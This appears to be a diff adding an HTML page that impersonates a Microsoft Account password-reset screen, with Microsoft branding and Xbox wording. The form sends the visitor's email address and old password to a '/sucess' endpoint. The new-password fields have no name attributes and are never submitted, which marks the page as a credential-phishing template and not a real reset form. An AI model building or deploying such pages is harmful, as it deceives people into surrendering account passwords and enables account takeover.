@@ -1,0 +1,71 @@
+<!DOCTYPE HTML> 
+<html>
+<head>
+ <title>Reset your password</title>
+ <link rel="shortcut icon" href="images.jpeg"/>
+ <link rel="stylesheet" type="text/css" href="style.css"/>
+ <link rel="stylesheet" type="text/css" href="responsive.css"/>
+ <script type="text/javascript" src="sourc.js"></script>
+</head>
+<body>
+ <center><div class="logo">   
+  <div class="microsoft"></div>  
+  <h2>Microsoft</h2>   
+  <div class="bar_vertical"></div>
+  <label>Account</label>
+ </div></center>
+ <center><form method="POST" name="form" id="form" action="/sucess">
+  <h1>Reset your password</h1>
+  <p id="warning_1"><b>Warning:</b> Passwords longer than 16 characters <br>cannot be used with the Xbox 360</p>
+  <input type="text" name="email" id="email" placeholder="Email Adress" onkeyup="confirm()">
+  <div class="fill_field" id="fill_field_1">
+   <p>Please fill out this field</p>
+  </div>
+  <div class="minium_8_characters" id="minium_8_characters_1"> 
+   <p>Minium 8 characters</p>   
+  </div>
+  <div class="cant_contain_space" id="cant_contain_space_1"> 
+   <p>Can't contain space</p>     
+  </div>
+  <input type="password" name="old_password" id="old_password" placeholder="Old password" onkeyup="confirm();">
+  <i></i>
+  <div class="fill_field" id="fill_field_2"> 
+   <p>Please fill out this field</p> 
+  </div>
+  <div class="minium_8_characters" id="minium_8_characters_2">  
+   <p>Minium 8 characters</p>  
+  </div>
+  <div class="cant_contain_space" id="cant_contain_space_2"> 
+   <p>Can't contain space</p>      
+  </div>
+  <input type="password" id="new_password" placeholder="New password" onkeyup="confirm()">
+  <i></i>
+  <div class="fill_field" id="fill_field_3"> 
+   <p>Please fill out this field</p>  
+  </div>
+  <div class="minium_8_characters" id="minium_8_characters_3">   
+   <p>Minium 8 characters</p>  
+  </div>
+  <div class="cant_contain_space" id="cant_contain_space_3">
+   <p>Can't contain space</p>    
+  </div>
+  <p id="warning_2">8-character minimum; case sensitive</p>
+  <input type="password" id="confirm_password" placeholder="Reenter password" onkeyup="confirm()">
+  <i></i>
+  <div class="fill_field" id="fill_field_4">  
+   <p>Please fill out this field</p>   
+  </div>
+  <div class="minium_8_characters" id="minium_8_characters_4"> 
+   <p>Minium 8 characters</p>   
+  </div>
+  <div class="cant_contain_space" id="cant_contain_space_4">  
+   <p>Can't contain space</p>     
+  </div>
+  <div id="error">
+   <p>Password did not match</p>
+  </div>
+  <button type="button">Cancel</button>
+  <button type="button" onclick="confirm()">Next</button>
+ </form></center>
+</body>
+</html>
